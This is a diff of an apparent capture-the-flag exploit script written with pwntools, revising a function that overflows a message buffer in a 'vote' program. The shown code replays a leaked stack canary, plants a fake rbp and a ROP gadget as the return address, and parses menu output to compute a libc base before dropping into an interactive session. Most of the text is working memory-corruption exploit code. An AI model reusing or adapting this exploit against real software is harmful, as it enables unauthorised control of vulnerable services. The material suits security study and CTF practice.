@@ -46,21 +46,19 @@ def hack_vote_ret(canary, base):
     # store rbp somewhere in bss where all of them are 0 to avoid bss corruption
     rbp = base + 0x202000
     rbp = p64(rbp)
-    # print('store rbp in --> ', hex(rbp))
     #                           |msg | cannary   |   rbp       |   ret            |)
     r.sendlineafter('Message: ', msg + canary    +  rbp        + p64(pop_r14r15_ret))
 
-    r.sendlineafter('>', '3')
-    # recv the menu, and eat it out
-    print('first recv --> ', r.recvuntil('>'))
-    recv_str = r.recvuntil('>')
+    r.recvuntil('>')
+    r.sendline('3')
+    pause()
+    r.recvuntil('>')
+    r.sendline('3')
+    recv_str = r.recvuntil('>').split('\n')
     print('and then --> ', recv_str)
 
-    libc_base = 0
-    libc_base = u64(recv_str + '\0\0') - 0x201ab0
+    libc_base = u64(recv_str[1] + '\0\0') - 0x201ab0
     print('libc_base --> ', hex(libc_base))
-
-    r.sendline('3')
 
     return libc_base
 
@@ -182,6 +180,4 @@ def main():
 
 main()
 r.interactive()
-r.sendlineafter('>', '3')
-print('final')
 r.close()
